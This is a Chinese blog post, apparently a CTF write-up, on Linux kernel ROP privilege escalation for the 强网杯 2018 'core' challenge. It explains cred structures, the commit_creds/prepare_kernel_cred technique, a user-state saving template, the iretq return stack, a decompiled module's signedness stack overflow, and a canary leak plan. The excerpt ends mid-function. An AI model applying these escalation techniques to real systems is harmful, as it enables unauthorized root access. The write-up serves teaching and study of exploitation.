<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
    <meta name="description" content="进程描述符（process descriptor）在内核中使用结构体 task_struct 表示一个进程,结构体定义于内核源码include&#x2F;linux&#x2F;sched.h task_struct结构体中的权限管理部分 &#x2F;* Process credentials: *&#x2F;&#x2F;* Tracer&amp;#x27;s credentials at attach: *&#x2F;const struct">
<meta property="og:type" content="article">
<meta property="og:title" content="Kernel Rop">
<meta property="og:url" content="https://grxer.gitee.io/2023/08/14/kernel-rop/index.html">
<meta property="og:site_name" content="Grxer&#39;s Blog">
<meta property="og:description" content="进程描述符（process descriptor）在内核中使用结构体 task_struct 表示一个进程,结构体定义于内核源码include&#x2F;linux&#x2F;sched.h task_struct结构体中的权限管理部分 &#x2F;* Process credentials: *&#x2F;&#x2F;* Tracer&amp;#x27;s credentials at attach: *&#x2F;const struct">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/14/kernel-rop/image-20230816162903167.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/14/kernel-rop/image-20230816144106041.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/14/kernel-rop/image-20230816162343753.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/14/kernel-rop/image-20230816161321011.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/08/14/kernel-rop/image-20230816174130879.png">
<meta property="article:published_time" content="2023-08-13T16:02:17.000Z">
<meta property="article:modified_time" content="2023-08-16T12:34:03.400Z">
<meta property="article:author" content="bxz">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://grxer.gitee.io/2023/08/14/kernel-rop/image-20230816162903167.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Kernel Rop</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/08/16/kernel-ret2usr/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/08/12/house-of-pig/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/08/14/kernel-rop/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/08/14/kernel-rop/&text=Kernel Rop"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/08/14/kernel-rop/&title=Kernel Rop"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/08/14/kernel-rop/&is_video=false&description=Kernel Rop"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Kernel Rop&body=Check out this article: https://grxer.gitee.io/2023/08/14/kernel-rop/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/08/14/kernel-rop/&title=Kernel Rop"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/08/14/kernel-rop/&title=Kernel Rop"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/08/14/kernel-rop/&title=Kernel Rop"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/08/14/kernel-rop/&title=Kernel Rop"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/08/14/kernel-rop/&name=Kernel Rop&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/08/14/kernel-rop/&t=Kernel Rop"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88process-descriptor%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">进程描述符（process descriptor）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP"><span class="toc-number">2.</span> <span class="toc-text">ROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2018-core"><span class="toc-number">3.</span> <span class="toc-text">强网杯 2018 - core</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">3.1.</span> <span class="toc-text">文件系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">3.2.</span> <span class="toc-text">启动脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#core-ko"><span class="toc-number">3.3.</span> <span class="toc-text">core.ko</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">3.4.</span> <span class="toc-text">调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#commit-creds-amp-init-cred"><span class="toc-number">3.5.</span> <span class="toc-text">commit_creds(&amp;init_cred)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#commit-creds-prepare-kernel-cred-NULL"><span class="toc-number">3.6.</span> <span class="toc-text">commit_creds(prepare_kernel_cred(NULL))</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Kernel Rop
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">bxz</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-08-13T16:02:17.000Z" itemprop="datePublished">2023-08-14</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="进程描述符（process-descriptor）"><a href="#进程描述符（process-descriptor）" class="headerlink" title="进程描述符（process descriptor）"></a>进程描述符（process descriptor）</h2><p>在内核中使用结构体 <code>task_struct</code> 表示一个进程,结构体定义于内核源码<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.5-rc2/source/include/linux/sched.h#L629">include&#x2F;linux&#x2F;sched.h</a></p>
<p>task_struct结构体中的权限管理部分</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">cred</span>;</span></span><br></pre></td></tr></table></figure>

<p><strong>Process credentials</strong> 是 kernel 用以判断一个进程权限的凭证，在 kernel 中使用 <code>cred</code> 结构体进行标识，对于一个进程而言应当有三个 cred：</p>
<ul>
<li><strong>ptracer_cred：</strong>使用<code>ptrace</code>系统调用跟踪该进程的上级进程的cred（gdb调试便是使用了这个系统调用，常见的反调试机制的原理便是提前占用了这个位置）</li>
<li><strong>real_cred：</strong>即<strong>客体凭证</strong>（<strong>objective cred</strong>），通常是一个进程最初启动时所具有的权限</li>
<li><strong>cred：</strong>即<strong>主体凭证</strong>（<strong>subjective cred</strong>），该进程的有效cred，kernel以此作为进程权限的凭证</li>
</ul>
<p>cred结构体在<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.5-rc2/source/include/linux/cred.h#L111">include&#x2F;linux&#x2F;cred.h</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The security context of a task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *    task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *    upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that some members of this structure belong to both categories - the</span></span><br><span class="line"><span class="comment"> * LSM security pointer for instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A task has two security pointers.  task-&gt;real_cred points to the objective</span></span><br><span class="line"><span class="comment"> * context that defines that task&#x27;s actual details.  The objective part of this</span></span><br><span class="line"><span class="comment"> * context is used whenever that task is acted upon.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * task-&gt;cred points to the subjective context that defines the details of how</span></span><br><span class="line"><span class="comment"> * that task is going to act upon another object.  This may be overridden</span></span><br><span class="line"><span class="comment"> * temporarily to point to another security context, but normally points to the</span></span><br><span class="line"><span class="comment"> * same context as task-&gt;real_cred.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage; 原子计数器，用于跟踪对该安全上下文结构的引用数量</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span> 任务的实际用户标识</span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span> 任务的实际组标识（real group ID）</span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span> 任务的保存用户标识（saved user ID），在权限切换时可能用到。</span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span> 任务的保存组标识（saved group ID），在权限切换时可能用到。</span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span> 任务的有效用户标识（effective user ID），用于权限检查和访问控制。</span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span> 任务的有效组标识（effective group ID），用于权限检查和访问控制。</span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span> 用于虚拟文件系统（VFS）操作的文件系统用户标识（filesystem user ID）</span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span> 用于虚拟文件系统（VFS）操作的文件系统组标识（filesystem group ID</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以直接把uid–&gt;fsgid 都修改为 0获得root权限</p>
<p>或者了利用rop执行<code>commit_creds(prepare_kernel_cred(NULL))</code>获得root权限</p>
<p>自从内核版本 <strong>6.2</strong> 起，<code>prepare_kernel_cred(NULL)</code> 将<strong>不再拷贝 init_cred，而是将其视为一个运行时错误并返回 NULL</strong>，只能<code>commit_creds(&amp;init_cred)</code></p>
<blockquote>
<p><code>init_cred</code>是<code>init</code> 进程的 <code>cred</code> ，因此其权限为root ,泄露出内核基址之后,如果保护开的不牛x，我们也便能够获得 <code>init_cred</code> 的地址</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred* <span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct* daemon)</span></span><br><span class="line">该函数用以拷贝一个进程daemon的cred结构体，并返回一个新的cred结构体</span><br><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line">该函数用以将一个新的cred结构体应用到进程</span><br></pre></td></tr></table></figure>

<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>主要是在内核栈栈溢出，rop执行特权函数提权后，返回用户态，再起一个shell就可以继承root权限，所以我们返回前要把栈伪造成正常进入内核提权时的栈</p>
<p><img src="/2023/08/14/kernel-rop/image-20230816162903167.png" alt="image-20230816162903167"></p>
<p>保存好用户栈的板子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//-masm=intel</span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>内核时返回用户态</p>
<ul>
<li><code>swapgs</code>指令恢复用户态 GS 寄存器</li>
<li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li>
</ul>
<p>返回用户态前，内核栈板子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">↓      提权操作的rop</span><br><span class="line">    swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure>

<h2 id="强网杯-2018-core"><a href="#强网杯-2018-core" class="headerlink" title="强网杯 2018 - core"></a>强网杯 2018 - core</h2><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/13_X5ZqLYyym2OPithQMeCQ">https://pan.baidu.com/s/13_X5ZqLYyym2OPithQMeCQ</a><br>提取码：w9xj</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/k/Q/give_to_player&gt; checksec core.ko</span><br><span class="line">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/core.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>看下init脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /proc/kallsyms &gt;/tmp/kallsyms #可以泄露commit_creds，prepare_kernel_cred 的函数的地址</span><br><span class="line">echo 1 &gt;/proc/sys/kernel/kptr_restrict#通过cat /proc/kallsyms查看函数地址时都显示0</span><br><span class="line">echo 1 &gt;/proc/sys/kernel/dmesg_restrict#不能用dmesg查看日志</span><br></pre></td></tr></table></figure>

<h3 id="启动脚本"><a href="#启动脚本" class="headerlink" title="启动脚本"></a>启动脚本</h3><p>只开启了kaslr</p>
<h3 id="core-ko"><a href="#core-ko" class="headerlink" title="core.ko"></a>core.ko</h3><p>创建了个虚拟文件节点来和内核通信</p>
<p><code>struct proc_dir_entry *proc_create(const char *name, umode_t mode, struct proc_dir_entry *parent, const struct file_operations *proc_fops);</code>函数可以快速创建一个文件节点</p>
<ul>
<li><code>name</code>：文件名</li>
<li><code>mode</code>：文件读写执行权限</li>
<li><code>parent</code>：该文件挂载的procfs节点，若为NULL则自动挂载到<code>/proc</code>目录下</li>
<li><code>proc_ops</code>：该文件的proc_ops结构体</li>
</ul>
<p><code>remove_proc_entry(const char *, struct proc_dir_entry *)</code>用以注销此前创建的文件</p>
<ul>
<li>第一个参数为文件名</li>
<li>第二个参数为其挂载的节点，若为NULL则默认为<code>/proc</code>目录</li>
</ul>
<p>这里的结构体甚至函数，不同内核版本可能会不一样，最好还是去当前内核版本源码里看一下 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.15.8/source/include/linux/fs.h#L1692">https://elixir.bootlin.com/linux/v4.15.8/source/include/linux/fs.h#L1692</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">    <span class="type">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="type">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="type">ssize_t</span> (*read_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">    <span class="type">ssize_t</span> (*write_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">    <span class="type">int</span> (*iterate) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line">    <span class="type">int</span> (*iterate_shared) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*poll)</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *)</span>;</span><br><span class="line">    <span class="type">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> mmap_supported_flags;</span><br><span class="line">    <span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line">    <span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line">    <span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="type">ssize_t</span> (*sendpage) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> page *, <span class="type">int</span>, <span class="type">size_t</span>, <span class="type">loff_t</span> *, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">    <span class="type">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="type">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">long</span>, <span class="keyword">struct</span> file_lock **, <span class="type">void</span> **);</span><br><span class="line">    <span class="type">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">              <span class="type">loff_t</span> len);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">    <span class="type">unsigned</span> (*mmap_capabilities)(<span class="keyword">struct</span> file *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">ssize_t</span> (*copy_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *,</span><br><span class="line">            <span class="type">loff_t</span>, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*clone_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *, <span class="type">loff_t</span>,</span><br><span class="line">            u64);</span><br><span class="line">    <span class="type">ssize_t</span> (*dedupe_file_range)(<span class="keyword">struct</span> file *, u64, u64, <span class="keyword">struct</span> file *,</span><br><span class="line">            u64);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>题目里重构了下write，unlocked_ioctl，release分别对用用户态的write，ioctl，close函数</p>
<p>ioctl函数里的case 0x6677889A，存在溢出问题</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v2[<span class="number">10</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, (<span class="type">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>

<p>判断a1 &gt; 63时用的是__int64，qmemcpy(v2, &amp;name, (unsigned __int16)a1);时用的是unsigned __int16,用一个低16bit较大的负数，如(0xffffffffffff0000|(0x100))可以实现内核栈溢出</p>
<p>这里name可以通过write控制</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, a2, a3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)a3;</span><br><span class="line">  printk(&amp;unk_230);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967282LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在rop只需要canary和commit_creds(prepare_kernel_cred(NULL))函数地址</p>
<p>core_read中的off可以通过case 0x6677889C控制，可以把canary读到我们用户态得变量里，泄露canary，函数地址可以通过&#x2F;tmp&#x2F;kallsyms来泄露</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  